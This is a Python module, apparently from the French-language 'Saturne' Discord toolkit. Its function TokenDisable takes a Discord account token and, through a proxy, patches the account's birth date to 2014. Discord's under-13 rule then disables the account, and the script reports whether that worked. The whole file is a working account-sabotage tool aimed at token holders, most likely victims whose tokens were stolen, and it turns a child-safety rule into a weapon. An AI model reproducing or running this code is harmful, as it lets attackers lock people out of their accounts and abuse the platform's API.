###############################################################
# ███████╗ █████╗ ████████╗██╗   ██╗██████╗ ███╗   ██╗███████╗
# ██╔════╝██╔══██╗╚══██╔══╝██║   ██║██╔══██╗████╗  ██║██╔════╝
# ███████╗███████║   ██║   ██║   ██║██████╔╝██╔██╗ ██║█████╗  
# ╚════██║██╔══██║   ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══╝  
# ███████║██║  ██║   ██║   ╚██████╔╝██║  ██║██║ ╚████║███████╗
# ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝
###############################################################
# Crée par GalackQSM
# Github: https://github.com/GalackQSM/Saturne
# Discord: https://discord.gg/saturnetools|XvjJpw4D3m
# © 2022 Saturne
###############################################################

import requests
import Saturne
from colorama import Fore
from util.plugins.common import getheaders, proxy

def TokenDisable(token):
    res = requests.patch('https://discordapp.com/api/v9/users/@me', proxies={"http": f'{proxy()}'}, headers=getheaders(token), json={'date_of_birth': '2014-2-11'})

    if res.status_code == 400:
        res_message = res.json().get('date_of_birth', ['aucun message de réponse'])[0]
        
        if res_message == "Vous devez avoir 13 ans ou plus pour utiliser Discord.":
            print(f'\n{Fore.RED}Token désactivé avec succès!{Fore.RESET}\n')
        elif res_message == "Vous ne pouvez pas mettre à jour votre date de naissance.":
            print('Le compte ne peut pas être désactivé')
        else:
            print(f'Réponse inconnue: {res_message}')
    else:
        print('Échec de la désactivation du compte')
    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Entrez n\'importe quoi pour continuer... {Fore.RED}')
    Saturne.main()